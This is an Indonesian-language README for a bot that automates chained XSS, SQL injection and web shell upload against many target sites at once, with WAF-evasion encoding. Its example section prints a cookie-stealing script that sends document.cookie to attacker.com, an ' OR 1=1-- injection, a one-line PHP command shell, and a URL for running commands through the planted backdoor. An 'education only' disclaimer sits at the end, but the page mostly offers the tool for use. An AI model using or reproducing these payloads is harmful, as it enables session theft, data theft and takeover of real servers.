# XSS-SQLI
XSS + SQL Injection + Web Shell Upload Bot
---

# **XSS + SQL Injection + Web Shell Upload Bot**  
**Versi: 1.0**  

## **📌 Tentang Script Ini**  
Script ini adalah **bot sederhana** yang menggabungkan tiga teknik serangan web yang umum:  
![17413997546818279413700194614756](https://github.com/user-attachments/assets/334b0168-6210-4f37-b99a-6ffbececf19b)

1️⃣ **XSS (Cross-Site Scripting)** → Menyisipkan script berbahaya untuk mencuri **cookie/session** user.  
2️⃣ **SQL Injection** → Mengeksploitasi celah SQL untuk mendapatkan **data sensitif** dari database.  
3️⃣ **Web Shell Upload** → Mengunggah file shell untuk mendapatkan **akses penuh ke server**.  

---

## **⚙️ Cara Kerja Script**  
✅ **User memasukkan target** (manual atau dari file).  
✅ **Bot menjalankan serangan berurutan** (XSS → SQLi → Web Shell).  
✅ **Jika SQL Injection berhasil**, lanjut **upload web shell** otomatis.  
✅ **Serangan dilakukan dengan encoding canggih** untuk **bypass WAF**.  
✅ **Menggunakan multi-threading** supaya bisa menyerang banyak target sekaligus.  

---

## **📂 Fitur Utama**  
✔️ **XSS Payload terenkripsi** → Meminimalkan deteksi oleh WAF.  
✔️ **Bypass WAF SQL Injection** → Menggunakan payload yang lebih stealth.  
✔️ **Web Shell Upload** → Menyisipkan backdoor di server target.  
✔️ **Bot otomatis multi-threading** → Bisa menyerang banyak target dalam waktu singkat.  
✔️ **Error Handling** → Script tidak akan crash jika target mati atau tidak responsif.  

---

## **🚀 Cara Menggunakan**  
### **1️⃣ Jalankan Script**  
```bash
python3 xss_sqli_shell.py
```
  
### **2️⃣ Pilih Metode Input Target**  
1️⃣ **Manual** → Masukkan URL target satu per satu.  
2️⃣ **Dari File** → Masukkan daftar target dari file (`targets.txt`).  

**Contoh format file `targets.txt`**  
```
http://victim.com/vuln.php?input=
http://testsite.com/comment.php?msg=
```

---

## **🔴 Contoh Serangan**  
📌 **XSS Attack:**  
```html
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

📌 **SQL Injection:**  
```sql
' OR 1=1--
```

📌 **Web Shell Upload:**  
- Mengunggah file `shell.php` berisi:  
```php
<?php system($_GET['cmd']); ?>
```
- Setelah berhasil, akses shell:  
```
http://target.com/uploads/shell.php?cmd=whoami
```

---

## **📌 Catatan**  
🔹 Script ini **sederhana** dan hanya untuk **edukasi** tentang keamanan web.  
🔹 Jangan digunakan untuk hal ilegal! Gunakan hanya di **sistem yang Anda miliki atau izin resmi**.  
🔹 **Pastikan memahami konsep dasar keamanan web** sebelum menggunakan script ini.  

---

## **👨‍💻 Dibuat Oleh**  
🛠️ **Cyber-Heroes** - Edukasi & Eksperimen Keamanan Web  
---
